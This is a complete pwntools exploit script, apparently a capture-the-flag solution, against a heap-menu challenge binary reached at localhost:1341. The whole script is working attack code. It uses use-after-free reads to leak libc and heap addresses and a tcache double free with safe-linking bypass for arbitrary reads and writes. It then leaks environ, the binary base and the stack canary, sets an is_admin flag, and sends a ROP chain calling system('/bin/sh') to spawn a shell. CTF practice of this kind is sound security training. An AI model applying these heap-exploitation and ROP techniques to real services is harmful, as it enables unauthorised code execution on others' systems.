from pwn import *

context.binary = elf = ELF('./challenge/chal_patched')
libc = ELF("./challenge/libc.so.6")

# this could also be done with fsop probably

# p = elf.process()
p = remote("localhost", 1341)
assert p

def do_create(index, size, password):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'index', str(index).encode())
    p.sendlineafter(b'size', str(size).encode())
    p.sendafter(b'password', password)

def do_print(index):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b'index', str(index).encode())

def do_delete(index):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b'index', str(index).encode())

def do_edit(password):
    p.sendlineafter(b'>', b'4')
    p.sendlineafter(b'password', password)

def setup_chunks(addr, size):

    for i in range(10):
        do_create(i, size, b'AAAA')

    for i in range(7):
        do_delete(i)

    do_delete(7)
    do_delete(8)
    do_delete(7)

    for i in range(7):
        do_create(i, size, b'AAAA')

    back = 16  if addr % 0x10 == 0 else 24
    do_create(0, size, p64((addr-back) ^ key))
    do_create(0, size, b'AAAA')
    do_create(0, size, b'AAAA')

def leak_addr(addr, size, cookie=False):
    setup_chunks(addr, size)
    do_create(0, size, b'A'*(25 if cookie else 24))
    do_print(0)
    val = u64(p.recvline()[26:-1].ljust(8, b'\x00'))
    if not cookie:
        return val

    return val & ~0xFF

def overwrite_addr(addr, value, size):
    setup_chunks(addr, size)
    do_create(0, size, b'A'*16 + p64(value))


do_create(0, 0x450, b'AAAA')
do_create(1, 16, b'BBBB')
do_delete(0)
do_print(0)

libc.address = u64(p.recvline()[2:-1].ljust(8, b'\x00')) - 0x23eb20

log.info(f"libc @ {hex(libc.address)}")

do_delete(1)
do_print(1)

key = u64(p.recvline()[2:-1].ljust(8, b'\x00'))
log.info(f"heap @ {hex(key << 12)}")

environ = leak_addr(libc.symbols['environ'], 64)

log.info(f"environ @ {hex(environ)}")

elf.address = leak_addr(environ - 48, 32) - 0x10f5

log.info(f"ELF @ {hex(elf.address)}")

canary = leak_addr(environ - 18*8, 48, True)

overwrite_addr(elf.symbols['is_admin'], 1, 88)

r = ROP(libc)
r.system(next(libc.search(b'/bin/sh\x00')))

chain = b'A'*24
chain += p64(canary)
chain += p64(0)
chain += p64(r.find_gadget(["ret"]).address)
chain += r.chain()


do_edit(chain)

p.interactive()
